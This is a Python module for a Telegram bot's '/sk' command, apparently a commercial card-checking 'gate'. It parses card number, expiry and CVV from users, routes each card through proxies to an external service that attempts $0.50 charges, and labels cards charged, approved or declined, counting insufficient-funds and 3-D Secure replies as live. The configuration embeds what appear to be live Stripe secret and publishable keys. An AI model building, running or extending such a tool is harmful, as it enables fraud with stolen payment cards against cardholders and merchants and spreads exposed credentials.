from live_emoji import plan_badge, dev_badge
import asyncio
import os
import re
import logging
import time
import random
import aiohttp
import psycopg2.extras
from html import escape
from typing import Optional, Tuple

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# AIOGRAM IMPORTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from aiogram import types, F, Router
from aiogram.exceptions import TelegramForbiddenError, TelegramBadRequest

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LOCAL IMPORTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from database import is_gate_enabled, get_user_credits, update_credits, get_db_connection
from bin import get_bin_info
from sub import get_premium_status
from proxy import global_proxy_manager

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIGURATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

SK_API_ENDPOINT = (
    "https://skbased.stormx.pw/skbased"
    "?key=Darkboy"
    "&sk=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"
    "&pk=pk_live_mml7hIGddV0ggi8yNy6WIyGT00BY9fU39e"
    "&amount=0.50"
    "&cc={}"
)

GATE_NAME      = "SK Bᴀsᴇᴅ | 0.50$"
GATE_KEY       = "sk"
COOLDOWN_SECS  = 10

CUSTOM_CHARGED_EMOJI_ID  = "5427168083074628963"
CUSTOM_APPROVED_EMOJI_ID = "6100515480735321747"
CUSTOM_DECLINED_EMOJI_ID = "5273914604752216432"

user_last_command_time: dict = {}
router = Router()

REACTIONS = [
    "airkiss", "blush", "brofist", "celebrate", "cheers", "clap",
    "cool", "cuddle", "dance", "handhold", "happy", "hug",
    "kiss", "laugh", "lick", "love", "nervous", "nom",
    "nuzzle", "nyah", "pat", "peek", "shy", "sip",
    "sleep", "smile", "smug", "sorry", "thumbsup",
    "tickle", "tired", "wave", "wink", "yay", "yes"
]

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# DATABASE HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _ensure_sk_columns():
    """Ensure sk_checked / sk_charged columns exist."""
    try:
        conn = get_db_connection()
        cur  = conn.cursor()
        cur.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS sk_checked INTEGER DEFAULT 0")
        cur.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS sk_charged INTEGER DEFAULT 0")
        conn.commit()
        conn.close()
        print("[DB] SK Stats columns checked/created.")
    except Exception as e:
        print(f"[DB] Error checking SK stats columns: {e}")

_ensure_sk_columns()

async def _update_sk_stats(user_id: int, is_charged: bool):
    def _sync():
        conn = get_db_connection()
        cur  = conn.cursor()
        cur.execute("UPDATE users SET sk_checked = sk_checked + 1 WHERE user_id = %s", (user_id,))
        if is_charged:
            cur.execute("UPDATE users SET sk_charged = sk_charged + 1 WHERE user_id = %s", (user_id,))
        conn.commit()
        conn.close()
    await asyncio.to_thread(_sync)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def get_anime_gif() -> str:
    reaction = random.choice(REACTIONS)
    try:
        async with aiohttp.ClientSession() as sess:
            async with sess.get(
                f"https://api.otakugifs.xyz/gif?reaction={reaction}",
                timeout=aiohttp.ClientTimeout(total=10)
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return data.get("url", "")
    except Exception as e:
        logging.error(f"[SK] GIF fetch error: {e}")
    return "https://media.giphy.com/media/LdOyjZ7hx5S3yCjQ8I/giphy.gif"

def _get_proxy_url() -> Optional[str]:
    try:
        return global_proxy_manager.get_proxy()
    except AttributeError:
        pass
    try:
        return global_proxy_manager.get_random()
    except Exception:
        return None

def luhn_check(card_number: str) -> bool:
    card_number = str(card_number).strip()
    if not card_number.isdigit():
        return False
    total = 0
    for i, ch in enumerate(card_number[::-1]):
        d = int(ch)
        if i % 2 == 1:
            d *= 2
            if d > 9:
                d -= 9
        total += d
    return total % 10 == 0

def build_user_link(user_obj) -> str:
    name = escape(user_obj.first_name or "User")
    if user_obj.username:
        return f'<a href="https://t.me/{escape(user_obj.username)}">{name}</a>'
    return f'<a href="tg://user?id={user_obj.id}">{name}</a>'

async def get_user_plan_name(user_id: int) -> str:
    is_premium, _ = get_premium_status(user_id)
    if is_premium:
        try:
            def _sync():
                conn = get_db_connection()
                cur  = conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor)
                cur.execute(
                    "SELECT plan FROM receipts WHERE user_id = %s ORDER BY purchased_on DESC LIMIT 1",
                    (user_id,)
                )
                row = cur.fetchone()
                conn.close()
                return row["plan"].upper() if row else "PREMIUM"
            return await asyncio.to_thread(_sync)
        except Exception as e:
            logging.error(f"[SK] plan fetch: {e}")
        return "PREMIUM"
    return "FREE"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SK API
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def parse_sk_response(data: dict) -> Tuple[str, str]:
    """
    Returns (status, raw_message).
    status: CHARGED | APPROVED | DECLINED | ERROR
    """
    if "_timeout" in data:
        return "ERROR", "Timeout"
    if "_exception" in data:
        return "ERROR", str(data["_exception"])[:80]
    if "_http_error" in data:
        return "ERROR", f"HTTP {data['_http_error']}"

    if "error" not in data:
        # Charge succeeded
        raw = data.get("message", "Charged $0.50")
        return "CHARGED", raw

    error        = data["error"]
    message      = error.get("message", "Unknown Error")
    decline_code = error.get("decline_code", "")
    code         = error.get("code", "")

    raw = f"{message} ({decline_code})" if decline_code else message

    if decline_code == "insufficient_funds":
        return "APPROVED", raw
    if decline_code in ("authentication_required", "3d_secure_required"):
        return "APPROVED", raw

    return "DECLINED", raw

async def call_sk_api(full_cc: str) -> dict:
    url       = SK_API_ENDPOINT.format(full_cc)
    proxy_url = _get_proxy_url()
    try:
        async with aiohttp.ClientSession() as sess:
            kwargs: dict = {"timeout": aiohttp.ClientTimeout(total=30)}
            if proxy_url:
                kwargs["proxy"] = proxy_url
            async with sess.get(url, **kwargs) as resp:
                if resp.status == 200:
                    return await resp.json(content_type=None)
                return {"_http_error": resp.status}
    except asyncio.TimeoutError:
        return {"_timeout": True}
    except Exception as e:
        logging.error(f"[SK] API error: {e}")
        return {"_exception": str(e)}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# COMMAND HANDLER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(F.text.startswith("/sk"))
async def sk_command(message: types.Message):

    # 1. Gate check
    if not await asyncio.to_thread(is_gate_enabled, GATE_KEY):
        await message.reply(
            f"🚧 <b>{GATE_NAME} Gate is under maintenance.</b>\n"
            "Will be fixed soon.",
            parse_mode="HTML"
        )
        return

    user    = message.from_user
    user_id = user.id
    now     = time.time()

    # 2. Premium / rate-limit
    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)
    if not is_premium:
        last = user_last_command_time.get(user_id, 0)
        elapsed = now - last
        if elapsed < COOLDOWN_SECS:
            remaining = round(COOLDOWN_SECS - elapsed, 1)
            await message.reply(
                f"<tg-emoji emoji-id=\"6255910249362885846\">⚠️</tg-emoji> <b>Aᴄᴛɪᴠᴇ Cᴏᴏʟᴅᴏᴡɴ !</b>\n\n"
                f"<b>Pʟᴇᴀsᴇ Wᴀɪᴛ <code>{remaining}</code> Sᴇᴄᴏɴᴅs Bᴇꜰᴏʀᴇ Cᴏɴᴛɪɴᴜɪɴɢ.</b>\n\n"
                f"<tg-emoji emoji-id=\"6136275172283391020\">⭐</tg-emoji> <b>Pᴜʀᴄʜᴀsᴇ Pʀᴇᴍɪᴜᴍ Pʟᴀɴ Fᴏʀ Usᴇ Cᴏᴍᴍᴀɴᴅs Wɪᴛʜᴏᴜᴛ Cᴏᴏʟᴅᴏᴡɴ.</b>",
                parse_mode="HTML"
            )
            return
        user_last_command_time[user_id] = now

    # 3. Extract card text
    parts    = message.text.split(maxsplit=1)
    raw_text = ""
    if len(parts) > 1:
        raw_text = parts[1].strip()
    elif message.reply_to_message:
        raw_text = (
            message.reply_to_message.text
            or message.reply_to_message.caption
            or ""
        )

    if not raw_text:
        await message.reply(
            "<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji> "
            "<b>Usage:</b> /sk <code>cc|mm|yy|cvv</code>\n"
            "Or reply to a message containing card details.",
            parse_mode="HTML"
        )
        return

    # 4. Parse card
    pattern = r'\b(\d{15,16})[|\s/?\\:]+(\d{2,4})[|\s/?\\:]+(\d{2,4})[|\s/?\\:]+(\d{3,4})\b'
    match   = re.search(pattern, raw_text)
    if not match:
        await message.reply(
            "<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji> <b>Invalid Card Format.</b>\n"
            "Please provide CC as <code>4242424242424242|05|27|123</code>",
            parse_mode="HTML"
        )
        return

    cc, mm, yy_raw, cvv = match.groups()
    yy           = yy_raw[2:] if len(yy_raw) == 4 else yy_raw
    formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"

    # 5. Luhn check
    if not luhn_check(cc):
        await message.reply(
            "<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji> <b>Invalid Card</b>\n"
            "Your card number failed Luhn validation.",
            parse_mode="HTML"
        )
        return

    # 6. Credits check
    credits = await asyncio.to_thread(get_user_credits, user_id)
    if not credits or credits <= 0:
        await message.reply(
            "<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji> <b>Iɴsᴜꜰꜰɪᴄɪᴇɴᴛ Cʀᴇᴅɪᴛs</b>\n\n"
            "Yᴏᴜ Nᴇᴇᴅ Aᴛ Lᴇᴀsᴛ <b>1 Cʀᴇᴅɪᴛ</b> Tᴏ Usᴇ Tʜɪs Gᴀᴛᴇ.\n"
            "Usᴇ /plan Tᴏ Gᴇᴛ Mᴏʀᴇ.",
            parse_mode="HTML"
        )
        return

    # 7. Plan name
    plan_name = await get_user_plan_name(user_id)

    # 8. Processing message
    proc_msg = await message.reply(
        f"<b>Pʀᴏᴄᴇssɪɴɢ...</b> <tg-emoji emoji-id=\"6154603635981423575\">⏳</tg-emoji>\n"
        f"<pre><code>{escape(formatted_cc)}</code></pre>\n"
        f"<b>Gᴀᴛᴇ ➺ {GATE_NAME}</b>",
        parse_mode="HTML"
    )

    # 9. Background task
    asyncio.create_task(
        _process_sk_check(message, proc_msg, user, user_id, formatted_cc, cc, plan_name)
    )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BACKGROUND PROCESSOR
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def _process_sk_check(message, proc_msg, user, user_id, formatted_cc, cc, plan_name):

    # A. API call
    check_started = time.time()
    raw_data   = await call_sk_api(formatted_cc)
    status_raw, raw_msg = parse_sk_response(raw_data)
    logging.info(f"[SK] {cc[:6]}xxxx | {status_raw} | {raw_msg}")

    # B. BIN lookup
    try:
        bin_info = await get_bin_info(cc[:6])
    except Exception:
        bin_info = {}

    bin_scheme = bin_info.get("scheme", "N/A")
    bin_bank   = bin_info.get("bank",   "N/A")
    country    = bin_info.get("country", "N/A")
    flag       = bin_info.get("country_emoji", "")
    bin_country = f"{flag} {country}" if flag else country
    bin_type    = bin_info.get("type") or "N/A"

    # C. Determine status display
    is_charged = False
    if status_raw == "CHARGED":
        is_charged  = True
        final_status = (
            f'<b>ᏟꮋꭺꭱƦᏽꭼꭰ</b> '
            f'<tg-emoji emoji-id="{CUSTOM_CHARGED_EMOJI_ID}">💎</tg-emoji>'
        )
    elif status_raw == "APPROVED":
        final_status = (
            f'<b>ᎪꮲꮲꭱƦꮎꮩꭼꭰ</b> '
            f'<tg-emoji emoji-id="{CUSTOM_APPROVED_EMOJI_ID}">✅</tg-emoji>'
        )
    elif status_raw == "DECLINED":
        final_status = (
            f'<b>Dᴇᴄʟɪɴᴇᴅ</b> '
            f'<tg-emoji emoji-id="{CUSTOM_DECLINED_EMOJI_ID}">❌</tg-emoji>'
        )
    else:
        final_status = "<b>Eʀʀᴏʀ / Tɪᴍᴇᴏᴜᴛ</b> ⚠️"

    # D. Credit deduction
    to_deduct = 1 if status_raw in ("CHARGED", "APPROVED") else 0
    if to_deduct > 0:
        bal = await asyncio.to_thread(get_user_credits, user_id)
        await asyncio.to_thread(update_credits, user_id, max(0, (bal or 0) - to_deduct))

    # E. Stats update
    await _update_sk_stats(user_id, is_charged)

    # F. Build caption
    user_link    = build_user_link(user)
    dev_link = dev_badge()
    user_display = f"{user_link} {plan_badge(plan_name)}"

    elapsed = time.time() - check_started
    caption = (
        f'<b><a href="https://t.me/broken_wiz">[⌭]</a> Sᴛᴀᴛᴜs ➵ {final_status}</b>\n'
        f"<tg-emoji emoji-id=\"5920055227133725805\">💳</tg-emoji>\n"
        f"⤷ <code>{escape(formatted_cc)}</code>\n"
        f"━━━━━━━━━━━\n"
        f'<b><a href="https://t.me/broken_wiz">⬢</a> Gᴀᴛᴇ ➵ {GATE_NAME}</b>\n'
        f'<b><a href="https://t.me/broken_wiz">⬡</a> Rᴀᴡ ➵ {escape(raw_msg)}</b>\n'
        f"━━━━━━━━━━━\n"
        f"<b>Tʏᴘᴇ ➵</b> <code>[ {escape(bin_type)} ]</code>\n"
        f"<b>Iɴꜰᴏ ➵</b> <code>{escape(bin_scheme)} - {escape(bin_bank)} - {escape(bin_country)}</code>\n"
        f"━━━━━━━━━━━\n"
        f"<tg-emoji emoji-id=\"5440621591387980068\">🔜</tg-emoji> <b>➵ {elapsed:.2f}s</b>\n"
        f"<tg-emoji emoji-id=\"6028240037366207289\">👤</tg-emoji> <b>➵ {user_display}</b>\n"
        f"<tg-emoji emoji-id=\"5429615084856969948\">🏴‍☠️</tg-emoji> <b>➵ {dev_link}</b>"
    )

    # G. Fetch GIF
    gif_url = await get_anime_gif()

    # H. Send result
    try:
        try:
            await proc_msg.delete()
        except Exception:
            pass
        await message.reply_animation(
            animation=gif_url,
            caption=caption,
            parse_mode="HTML",
            disable_web_page_preview=True
        )
    except (TelegramForbiddenError, TelegramBadRequest) as e:
        logging.warning(f"[SK] GIF send failed, falling back to text: {e}")
        try:
            await proc_msg.edit_text(caption, parse_mode="HTML", disable_web_page_preview=True)
        except Exception as edit_err:
            logging.error(f"[SK] edit fallback failed: {edit_err}")
            await message.reply(caption, parse_mode="HTML", disable_web_page_preview=True)
    except Exception as e:
        logging.error(f"[SK] send error: {e}")
        try:
            await proc_msg.edit_text(caption, parse_mode="HTML", disable_web_page_preview=True)
        except Exception:
            await message.reply(caption, parse_mode="HTML", disable_web_page_preview=True)
